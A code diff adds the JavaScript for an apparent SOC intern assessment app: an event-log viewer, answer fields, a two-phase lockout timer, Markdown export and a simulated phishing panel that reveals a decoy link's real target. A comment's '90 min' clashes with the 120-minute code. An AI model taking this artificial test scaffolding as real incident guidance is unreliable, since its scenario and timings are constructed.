+    const open=openRows.has(e.id);
+    const main=`<tr class="ev ${open?"open":""}" data-id="${e.id}">
+      <td class="id">${e.id}</td><td>${esc(e.ts)}</td><td class="dim">${esc(e.src)}</td>
+      <td>${esc(e.host)}</td><td class="dim">${esc(e.user)}</td><td>${esc(e.sip)}</td>
+      <td>${esc(e.dip)}</td><td class="dim">${esc(e.proc)}</td><td>${esc(e.evt)}</td>
+      <td><span class="sev sev-${e.sev.toLowerCase()}">${e.sev}</span></td>
+      <td class="dim">${open?"hide":"view"}</td></tr>`;
+    const raw = open ? `<tr class="rawrow"><td colspan="11">
+        <div class="rawbar"><button class="btn sm" data-copy="${e.id}">Copy this event</button></div>
+        <div class="raw">${esc(e.raw)}</div></td></tr>` : "";
+    return main+raw;
+  }).join("");
+  $("#tcount").textContent = `${rows.length} of ${EVENTS.length} events shown`;
+}
+$("#tbody").addEventListener("click", ev=>{
+  const c=ev.target.closest("[data-copy]");
+  if(c){ copyEvent(c.dataset.copy); ev.stopPropagation(); return; }
+  const tr=ev.target.closest("tr.ev"); if(!tr) return;
+  const id=tr.dataset.id;
+  openRows.has(id) ? openRows.delete(id) : openRows.add(id);
+  render();
+});
+function evText(e){
+  return `Event ${e.id}\nTimestamp (as recorded): ${e.ts}\nSource: ${e.src}\nHost: ${e.host}\nUser: ${e.user}\n`
+       + `Source IP: ${e.sip}\nDestination IP: ${e.dip}\nProcess: ${e.proc}\nEvent: ${e.evt}\nSeverity: ${e.sev}\n\n${e.raw}\n`;
+}
+function copyText(t,msg){
+  navigator.clipboard ? navigator.clipboard.writeText(t).then(()=>toast(msg),()=>fallbackCopy(t,msg)) : fallbackCopy(t,msg);
+}
+function fallbackCopy(t,msg){
+  const a=document.createElement("textarea"); a.value=t; document.body.appendChild(a); a.select();
+  try{ document.execCommand("copy"); toast(msg); }catch(e){ toast("Copy blocked by the browser"); }
+  a.remove();
+}
+function copyEvent(id){ const e=EVENTS.find(x=>x.id===id); if(e) copyText(evText(e), "Event "+id+" copied"); }
+
+["#q","#fSource","#fSev","#fHost","#fUser"].forEach(s=>$(s).addEventListener("input",render));
+$("#clearF").onclick=()=>{ ["#q","#fSource","#fSev","#fHost","#fUser"].forEach(s=>$(s).value=""); render(); };
+$("#copyAll").onclick=()=>{ const r=filtered(); copyText(r.map(evText).join("\n" + "-".repeat(60) + "\n"), r.length+" events copied"); };
+$("#expandAll").onclick=()=>{
+  const r=filtered();
+  if(r.every(e=>openRows.has(e.id))){ r.forEach(e=>openRows.delete(e.id)); $("#expandAll").textContent="Expand all raw"; }
+  else { r.forEach(e=>openRows.add(e.id)); $("#expandAll").textContent="Collapse all raw"; }
+  render();
+};
+render();
+
+/* ---------- answers ---------- */
+$$("textarea[data-a]").forEach(t=>{
+  t.addEventListener("input",()=>{ S.answers[t.dataset.a]=t.value; refreshCounters(); updateProgress(); queueSave(); });
+});
+$$("[data-choice]").forEach(g=>{
+  g.addEventListener("click",e=>{
+    const b=e.target.closest(".choice"); if(!b||S.locked) return;
+    g.querySelectorAll(".choice").forEach(x=>x.classList.toggle("on",x===b));
+    S.choices[g.dataset.choice]=b.dataset.val; updateProgress(); queueSave();
+  });
+});
+$$("select[data-rank]").forEach(s=>{
+  s.addEventListener("change",()=>{ S.ranks[s.dataset.rank]=s.value; checkRanks(); updateProgress(); queueSave(); });
+});
+$$("[data-ck]").forEach(c=>{
+  c.addEventListener("change",()=>{ S.checks[c.dataset.ck]=c.checked; c.closest(".check").classList.toggle("done",c.checked); queueSave(); });
+});
+$("#candName").addEventListener("input",e=>{ S.cand.name=e.target.value; queueSave(); });
+$("#candEmail").addEventListener("input",e=>{ S.cand.email=e.target.value; queueSave(); });
+
+function checkRanks(){
+  const vals=$$("select[data-rank]").map(s=>s.value).filter(Boolean);
+  const dup=vals.length!==new Set(vals).size;
+  $$("select[data-rank]").forEach(s=>{
+    const d = s.value && vals.filter(v=>v===s.value).length>1;
+    s.classList.toggle("rankdup",!!d);
+  });
+  $("#rankWarn").textContent = dup ? "Each rank from 1 to 5 should be used once." : (vals.length===5 ? "Ranking complete." : "");
+  $("#rankWarn").style.color = dup ? "var(--crit)" : "var(--faint)";
+}
+function words(s){ return (s||"").trim() ? (s.trim().split(/\s+/).length) : 0; }
+function refreshCounters(){
+  $$(".counter[data-for]").forEach(c=>{
+    const ta=document.querySelector(`textarea[data-a="${c.dataset.for}"]`);
+    const lim=parseInt(ta.dataset.words,10), w=words(ta.value);
+    c.textContent = `${w} / ${lim} words · ${ta.value.length} characters`;
+    c.classList.toggle("over", w>lim);
+  });
+}
+const TOTAL = 24;
+function answeredCount(){
+  let n=0;
+  $$("textarea[data-a]").forEach(t=>{ if((t.value||"").trim().length>12) n++; });
+  n += Object.keys(S.choices).filter(k=>S.choices[k]).length;
+  if($$("select[data-rank]").every(s=>s.value)) n++;
+  return n;
+}
+function updateProgress(){
+  const n=Math.min(answeredCount(),TOTAL);
+  $("#progFill").style.width=(n/TOTAL*100)+"%";
+  $("#progTxt").textContent=`${n} of ${TOTAL} answered`;
+}
+
+/* ---------- AI disclosure toggle ---------- */
+function syncAi(){
+  const v=S.choices.aiUsed;
+  const box=$("#aiFields");
+  box.style.opacity = (v==="No") ? ".45" : "1";
+  box.querySelectorAll("textarea").forEach(t=>{ if(!S.locked) t.readOnly = (v==="No"); });
+}
+document.querySelector('[data-choice="aiUsed"]').addEventListener("click",()=>setTimeout(syncAi,0));
+
+/* ---------- phishing panel ---------- */
+const vb=$("#verifyBtn"), hb=$("#hoverbar");
+function showReal(){ hb.innerHTML = `link text: <code>${vb.dataset.display}</code><br>resolves to: <b>${vb.dataset.real}</b>`; }
+function hideReal(){ hb.textContent = "Hover or focus the button to see where it actually resolves."; }
+vb.addEventListener("mouseenter",showReal); vb.addEventListener("focus",showReal);
+vb.addEventListener("mouseleave",hideReal); vb.addEventListener("blur",hideReal);
+vb.addEventListener("click",e=>{ e.preventDefault(); showReal(); toast("Training simulation — the link was not opened."); });
+$("#fakeSignIn").addEventListener("click",e=>{
+  e.preventDefault();
+  $("#pE").value=""; $("#pP").value="";
+  $("#simBanner").style.display="block";
+});
+
+/* ---------- timer: 90 min investigation + 30 min write-up ---------- */
+const PHASE1 = 120*60*1000;     /* investigation — dataset open */
+const PHASE2 = 30*60*1000;      /* write-up — answers only      */
+let tick=null;
+function fmt(ms){
+  if(ms<0) ms=0;
+  const s=Math.floor(ms/1000);
+  return [Math.floor(s/3600),Math.floor(s%3600/60),s%60].map(n=>String(n).padStart(2,"0")).join(":");
+}
+let warned={};
+function target(){ return S.dataLocked ? S.finalDeadline : S.deadline; }
+function runTimer(){
+  clearInterval(tick);
+  tick=setInterval(()=>{
+    const left=target()-Date.now();
+    const c=$("#clock");
+    c.textContent=fmt(left);
+    c.classList.toggle("warn", left<=15*60*1000 && left>5*60*1000);
+    c.classList.toggle("crit", left<=5*60*1000);
+    const marks = S.dataLocked ? [10,5,1] : [20,10,5,1];
+    marks.forEach(m=>{
+      const k=(S.dataLocked?"b":"a")+m;
+      if(!warned[k] && left<=m*60*1000 && left>0){
+        warned[k]=true;
+        toast(S.dataLocked
+          ? m+" minute"+(m>1?"s":"")+" left before everything locks."
+          : m+" minute"+(m>1?"s":"")+" of dataset access left — copy or export what you need now.");
+      }
+    });
+    if(left<=0){
+      clearInterval(tick);
+      if(!S.dataLocked) lockData(false); else lockAll(false);
+    }
+  },1000);
+}
+function startAssessment(){
+  if(S.started) return;
+  S.started=true; S.startedAt=Date.now();
+  S.deadline=S.startedAt+PHASE1;
+  S.finalDeadline=S.startedAt+PHASE1+PHASE2;
+  $("#gate").classList.add("hidden");
+  $("#startBtn").disabled=true; $("#startBtn").textContent="In progress";
+  $("#statePill").textContent="Investigation open"; $("#statePill").className="pill live";
+  save(); runTimer();
+  toast("Clock started. The dataset closes in 2 hours.");
+}
+$("#startBtn").onclick=startAssessment;
+$("#gateStart").onclick=startAssessment;
+$("#gatePreview").onclick=()=>{ $("#gate").classList.add("hidden"); toast("Timer not started. Press start when you are ready."); };
+
+/* ---------- phase 1 -> 2: dataset closes, answers stay open ---------- */
+function lockData(silent){
+  S.dataLocked=true;
+  $("#dataMask").classList.add("locked");
+  $("#q").disabled=true;
+  ["#fSource","#fSev","#fHost","#fUser","#clearF","#copyAll","#expandAll"].forEach(x=>$(x).disabled=true);
+  $("#clockLbl").textContent="write-up window";
+  $("#statePill").textContent="Write-up — dataset closed"; $("#statePill").className="pill";
+  $("#startBtn").textContent="Write-up phase"; $("#startBtn").disabled=true;
+  save(); runTimer();
+  if(!silent){
+    $("#cmTitle").textContent="Dataset closed";
+    $("#cmBody").innerHTML="The 2-hour investigation window is over and the log data is no longer readable.<br><br>Your answer fields stay open for <b>30 more minutes</b>. Finish your answers from the notes you kept, then export.";
+    $("#cmYes").textContent="Continue writing"; $("#cmNo").textContent="Export now";
+    $("#cmYes").onclick=closeModal;
+    $("#cmNo").onclick=()=>{ exportNotes(); closeModal(); };
+    $("#confirmModal").classList.add("on");
+  }
+}
+
+/* ---------- phase 2 -> end: everything locks ---------- */
+function lockAll(silent){
+  if(!S.dataLocked) lockData(true);
+  S.locked=true;
+  clearInterval(tick);
+  $("#clock").textContent="00:00:00"; $("#clock").classList.add("crit");
+  $("#clockLbl").textContent="closed";
+  $("#statePill").textContent="Locked"; $("#statePill").className="pill locked";
+  $("#startBtn").textContent="Window closed";
+  $$("textarea[data-a]").forEach(t=>{ t.readOnly=true; t.style.opacity=".65"; });
+  $$("select[data-rank]").forEach(x=>x.disabled=true);
+  $$("[data-choice] .choice").forEach(b=>b.disabled=true);
+  $("#submitBtn").disabled=true;
+  save();
+  if(!silent){
+    $("#cmTitle").textContent="Assessment closed";
+    $("#cmBody").innerHTML="The assessment is closed and every field is now locked.<br><br>You can still export your answers. Email your PDF report and this export to <b>timuzin.razit@brainstation-23.com</b> — the deadline is <b>24 hours from the invitation email Brain Station 23 sent you</b>, not from now.";
+    $("#cmYes").textContent="Export my answers"; $("#cmNo").textContent="Close";
+    $("#cmYes").onclick=()=>{ exportNotes(); closeModal(); };
+    $("#cmNo").onclick=closeModal;
+    $("#confirmModal").classList.add("on");
+  }
+}
+function closeModal(){ $("#confirmModal").classList.remove("on"); }
+$("#cmNo").onclick=closeModal;
+
+/* ---------- export ---------- */
+function download(name, text, type){
+  const b=new Blob([text],{type:type||"text/plain;charset=utf-8"});
+  const u=URL.createObjectURL(b), a=document.createElement("a");
+  a.href=u; a.download=name; document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(()=>URL.revokeObjectURL(u),1500);
+}
+const LABELS={
+  c1q1j:"C1 Q1 — Genuine incident? justification", c1q2:"C1 Q2 — Affected assets",
+  c1q3:"C1 Q3 — Attack timeline", c1q4:"C1 Q4 — Initial access vector",
+  c1q5:"C1 Q5 — Post-access activity", c1q6:"C1 Q6 — Indicators of compromise",
+  c1q7:"C1 Q7 — MITRE ATT&CK mapping", c1q8j:"C1 Q8 — Severity justification",
+  c1q9:"C1 Q9 — Containment actions", c1q10:"C1 Q10 — Additional evidence required",
+  c1q11:"C1 Q11 — Attacker IP address",
+  c2q2:"C2 Q2 — Phishing indicators", c2q3:"C2 Q3 — Likely objective",
+  c2q4:"C2 Q4 — Response to a click", c2q5:"C2 Q5 — Additional evidence",
+  c3j:"C3 — Ranking justification",
+  commsCto:"Comms A — CTO summary", commsCustomer:"Comms B — Customer notification",
+  aiTools:"AI A2 — Tools used and for what", aiPrompts:"AI A3 — Prompts used (verbatim)",
+  aiRejected:"AI A4 — What the AI got wrong / what was rejected"
+};
+function notesMd(){
+  const L=[];
+  L.push("# FinSecure — SOC Intern Assessment: candidate answers","");
+  L.push(`Candidate: ${S.cand.name||"(not given)"}  <${S.cand.email||"(not given)"}>`);
+  L.push(`Started: ${S.startedAt?new Date(S.startedAt).toISOString():"n/a"}`);
+  L.push(`Dataset closed: ${S.deadline?new Date(S.deadline).toISOString():"n/a"}`);
+  L.push(`Assessment closed: ${S.finalDeadline?new Date(S.finalDeadline).toISOString():"n/a"}`);
+  L.push(`Exported: ${new Date().toISOString()}`);
+  L.push(`Status: ${S.submitted?"submitted":(S.locked?"locked":(S.dataLocked?"write-up phase":"in progress"))}`);
+  L.push("Send this file plus the PDF report to timuzin.razit@brainstation-23.com");
+  L.push("Deadline: 24 hours from the invitation email sent by Brain Station 23","");
+  L.push("## Challenge 1 — Investigation","");
+  L.push(`**Q1 verdict:** ${S.choices.c1q1||"(not answered)"}`);
+  ["c1q1j","c1q2","c1q3","c1q4","c1q5","c1q6","c1q7"].forEach(k=>L.push("",`### ${LABELS[k]}`,"",S.answers[k]||"(not answered)"));
+  L.push("",`**Q8 severity:** ${S.choices.c1q8||"(not answered)"}`);
+  ["c1q8j","c1q9","c1q10","c1q11"].forEach(k=>L.push("",`### ${LABELS[k]}`,"",S.answers[k]||"(not answered)"));
+  L.push("","## Challenge 2 — Phishing","",`**Verdict:** ${S.choices.c2q1||"(not answered)"}`);
+  ["c2q2","c2q3","c2q4","c2q5"].forEach(k=>L.push("",`### ${LABELS[k]}`,"",S.answers[k]||"(not answered)"));
+  L.push("","## Challenge 3 — Alert triage","");
+  L.push("| Alert | Rank |","| --- | --- |");
+  ["A","B","C","D","E"].forEach(a=>L.push(`| ${a} | ${S.ranks[a]||"-"} |`));
+  L.push("",`### ${LABELS.c3j}`,"",S.answers.c3j||"(not answered)");
+  L.push("","## Communication","");
+  L.push(`### ${LABELS.commsCto} (${words(S.answers.commsCto)} words)`,"",S.answers.commsCto||"(not answered)");
+  L.push("",`### ${LABELS.commsCustomer} (${words(S.answers.commsCustomer)} words)`,"",S.answers.commsCustomer||"(not answered)");
+  L.push("","## AI use disclosure","",`**Used an AI assistant:** ${S.choices.aiUsed||"(not answered)"}`);
+  ["aiTools","aiPrompts","aiRejected"].forEach(k=>L.push("",`### ${LABELS[k]}`,"",S.answers[k]||"(not answered)"));
+  L.push("","---","","All rights reserved to CyberStation by Brain Station 23.");
+  return L.join("\n");
+}
+function slug(){ return (S.cand.name||"candidate").toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/^-|-$/g,""); }
+function exportNotes(){ download(`finsecure-soc-answers-${slug()}.md`, notesMd(), "text/markdown"); toast("Answers exported"); }
+$("#expNotes").onclick=exportNotes;
+$("#expJson").onclick=()=>{ download(`finsecure-soc-answers-${slug()}.json`, JSON.stringify(S,null,2), "application/json"); toast("Backup exported"); };
+$("#expTemplate").onclick=()=>{ download("finsecure-soc-report-template.md", REPORT_TEMPLATE, "text/markdown"); toast("Report template downloaded"); };
+$("#impBtn").onclick=()=>$("#impFile").click();
+$("#impFile").addEventListener("change",async e=>{
+  const f=e.target.files[0]; if(!f) return;
+  try{
+    const parsed=JSON.parse(await f.text());
+    S=Object.assign(S,parsed); await save();
+    location.reload();
+  }catch(err){ toast("That file could not be read as a saved answer set."); }
+});
+
+const REPORT_TEMPLATE = `# FinSecure — Security Incident Investigation Report
+
+Submit to: timuzin.razit@brainstation-23.com
+Subject line: SOC Intern Assessment — <your name>
+Deadline: 24 hours from the invitation email sent by Brain Station 23
+
+Candidate:
+Date:
+Investigation window:
+Timezone used for all timestamps in this report:
+
+## 1. Executive summary
+(Plain language. What happened, what is affected, how confident you are.)
+
+## 2. Investigation findings
+(Label every claim FACT / HYPOTHESIS / CONFIRMED / UNKNOWN and cite Event IDs.)
+
+## 3. Timeline
+| Time (normalised) | Event ID | Source | Activity | Interpretation | Confidence |
+| --- | --- | --- | --- | --- | --- |
+
+## 4. Affected assets
+| Asset | Type | Status (confirmed / suspected / cleared) | Evidence |
+| --- | --- | --- | --- |
+
+## 5. Indicators of compromise
+| Indicator | Type | Context | Confidence |
+| --- | --- | --- | --- |
+
+## 6. MITRE ATT&CK mapping
+| Tactic | Technique | ID | Supporting Event IDs |
+| --- | --- | --- | --- |
+
+## 7. Severity assessment
+(Rating plus the business reasoning behind it.)
+
+## 8. Immediate response
+(Containment, eradication, recovery. Ordered by priority.)
+
+## 9. Additional evidence required
+(What you would pull next, and what question each item would answer.)
+
+## 10. Analyst confidence and assumptions
+(What you could not determine, and what would change your conclusion.)
+
+## Appendix A — Phishing analysis
+Verdict:
+Evidence:
+Attack objective:
+Recommended response:
+
+## Appendix B — Alert triage
+Ranking and justification.
+
+## Appendix C — Communication
+CTO summary (max 150 words):
+Customer notification (max 200 words):
+
+## Appendix D — AI use disclosure
+Did you use an AI assistant?
+Tools used, and for which parts:
+Prompts used (paste verbatim):
+What the AI got wrong, and what you rejected:
+
+---
+All rights reserved to CyberStation by Brain Station 23.
+`;
+
+/* ---------- submit ---------- */
+$("#submitBtn").onclick=()=>{
+  if(S.locked) return;
+  const missing=[];
+  if(!S.cand.name || !S.cand.email) missing.push("your name and email");
+  const unchecked=$$("[data-ck]").filter(c=>!c.checked).length;
+  if(unchecked) missing.push(`${unchecked} checklist item${unchecked>1?"s":""}`);
+  $("#cmTitle").textContent="Submit assessment?";
+  $("#cmBody").innerHTML = (missing.length
+    ? `<b style="color:var(--med)">Still outstanding: ${missing.join(", ")}.</b><br><br>`
+    : "")
+    + "Your in-app answers will be locked and can no longer be edited. You will still be able to export them. The written report remains due within 24 hours.";
+  $("#cmYes").textContent="Yes, submit"; $("#cmNo").textContent="Go back";
+  $("#cmYes").onclick=()=>{
+    S.submitted=true;
+    lockAll(true);
+    $("#statePill").textContent="Submitted"; $("#statePill").className="pill live";
+    $("#submitState").textContent="Submitted "+new Date().toLocaleString();
+    closeModal(); exportNotes();
+  };
+  $("#confirmModal").classList.add("on");
+};
+
+/* ---------- nav ---------- */
+$$(".navlink").forEach(b=>b.onclick=()=>{
+  document.getElementById(b.dataset.go).scrollIntoView({behavior:"smooth",block:"start"});
+});
+const secs=$$("section");
+const obs=new IntersectionObserver(es=>{
+  es.forEach(e=>{
+    if(e.isIntersecting) $$(".navlink").forEach(b=>b.classList.toggle("on", b.dataset.go===e.target.id));
+  });
+},{rootMargin:"-70px 0px -60% 0px"});
+secs.forEach(s=>obs.observe(s));
+
+window.addEventListener("beforeunload", e=>{
+  if(S.started && !S.locked){ e.preventDefault(); e.returnValue=""; }
+});
+
+/* ---------- boot ---------- */
+(async function(){
+  await load();
+  if(S.started && !S.locked && S.deadline){
+    $("#startBtn").disabled=true; $("#startBtn").textContent="In progress";
+    const now=Date.now();
+    if(now < S.deadline){
+      $("#statePill").textContent="Investigation open"; $("#statePill").className="pill live";
+      $("#clock").textContent=fmt(S.deadline-now); runTimer();
+    } else if(now < S.finalDeadline){
+      lockData(true);
+      $("#clock").textContent=fmt(S.finalDeadline-now);
+    } else {
+      lockAll(true);
+    }
+  }
+  if(S.submitted){ $("#statePill").textContent="Submitted"; $("#statePill").className="pill live"; }
+  refreshCounters(); updateProgress(); syncAi();
+})();
+</script>
+</body>
+</html>
